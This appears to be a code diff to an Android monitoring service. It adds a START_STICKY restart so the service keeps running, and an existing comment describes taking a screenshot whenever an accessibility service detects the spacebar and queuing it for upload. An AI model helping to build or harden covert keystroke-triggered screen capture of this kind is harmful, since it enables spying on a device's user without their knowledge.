@@ -61,6 +61,11 @@ public class MonitoringForegroundService extends Service {
         Log.d(TAG, "Monitoring foreground service started");
     }
 
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY;
+    }
+
     /**
      * When spacebar is detected by AccessibilityService,
      * capture a screenshot and queue it for upload.
